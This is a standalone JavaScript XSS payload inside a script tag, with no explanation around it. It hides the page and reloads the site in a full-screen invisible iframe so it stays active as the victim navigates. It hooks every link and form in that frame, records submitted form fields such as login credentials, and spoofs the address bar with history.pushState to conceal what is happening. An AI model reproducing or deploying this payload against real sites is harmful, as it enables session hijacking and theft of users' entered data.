<script>
(function() {
	var d = new Date();
	function log(m){
		var s = d;
		for(i in m){ s += "\n" + i + ":" + m[i] + " ";	}
		console.log(s);
	}

	function spoof(k){
		window.history.pushState({}, "", k);
	}

	function hook(){
		$('#xss').contents().find('a').bind('click', function() {
			log({"Event":"Link", "Current":document.URL, "Target":$(this).attr('href')});
			spoof($(this).attr('href'));
		});
		$('#xss').contents().find('form').bind('submit', function() {
			var l = {"Event":"Form", "Current":document.URL, "Target":$(this).attr('action')};
			$.each($(this).serializeArray(), function(i, f) { l[f.name] = f.value; });
			log(l);
			spoof($(this).attr('action'));
		});
	}

	function poison() {
		if (self == top){
			$('body').children().hide();
			log({"Hooked":document.URL});
			$('<iframe id="xss">').attr('src', document.URL).css({
				"position":"fixed", "top":"0px", "left":"0px", "bottom":"0px", "right":"0px", "width":"100%", "height":"100%", "border":"none", "margin":"0", "padding":"0", "overflow":"hidden", "z-index":"999999"
			}).appendTo('body').load(function(){
				hook();
			});
		}
	}

	function poll() {
		if (typeof(jQuery) !== 'undefined') {
			clearInterval(interval);
			poison();
		}
	}
    if (typeof(jQuery) == 'undefined') {
        var s = document.createElement('script');
		s.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'code.jquery.com/jquery-latest.min.js';
        document.head.appendChild(s);
        var interval = setInterval(poll, 50);
    } else {
        poison();
    }
})();
</script>